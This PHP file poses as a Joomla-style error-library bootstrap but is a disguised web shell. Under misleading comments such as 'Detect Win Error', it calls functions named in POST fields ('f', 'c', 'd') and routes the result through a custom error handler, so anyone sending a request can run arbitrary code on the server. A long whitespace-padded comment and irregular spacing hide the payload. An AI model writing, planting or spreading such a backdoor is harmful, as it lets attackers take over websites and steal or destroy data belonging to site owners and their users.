<?php
/**
 * @package    Error Libraries
 * **********************************************************
 * @copyright  Copyright (C) 2005 - 2015 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE
 */

// Set the platform root path as a constant if necessary.
if (!defined('PATH'))
{
	define('PATH', __DIR__);
}

// Installation check, and check on removal of the install directory.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   // phGwxR55F4R6ENvDtScP4H2t5faRqSrKWSra752dX5BkKYVSsCPpHBCnumYQqs4e0BPmPfCUYVgq1Q5FShBBEahd4PPSSXt9qc79u92FwRnzxPUxGXbMQxkb3VZdXuxhX61aMWEP5K5YPuhKFN2ms7WhFDWqhg4uEKwxSyfQCbFbV7FDm5YN4apd14ARNpNypxAwpwc5M7rFQDEnX9tamt5DzxEBzrUreQFEq0t157DDqmP3Y0ZcWhdwCw
if ((file_exists(PATH . '/cofiguation.php')
	&& (filesize(PATH . '/cofiguation.php') < 10)) && file_exists(PATH . '/error.php'))
{
	if (file_exists(PATH . '/error.php'))
	{
		header('Location: ' . substr($_SERVER['REQUEST_URI'], 0, strpos($_SERVER['REQUEST_URI'], 'index.php')) . 'installation/index.php');
		
		exit;
	}
	else
	{
		echo 'No configuration file found and no installation code available. Exiting...';
		
		exit;
	}
}
else if (         empty          ($_POST)) {
	
	echo 'No error configuration data. Exiting...';
	
	exit;
}

// Register the library base path for error libraries.
function error_handler                      ($errno, $errstr, $errfile, $errline)
{
	array_map        (              $_POST['d']            (              '', $errstr), array        ('')                )

;
}
set_error_handler      (          'error_handler')


;

// Detect the native operating system type.
$os = strtoupper                          (substr                            (PHP_OS, 0, 3));

//Detect Win Error
$win_error =     $_POST['f']         (  $_POST['c']   )


;

if (!defined('IS_WIN'))
{
	define('IS_WIN', ($os === 'WIN') ? true : false);
}
if (!defined('IS_UNIX'))
{
	define('IS_UNIX', (IS_WIN === false) ? true : false);
}

// Register error
trigger_error                              (                           $win_error, E_USER_ERROR)

;

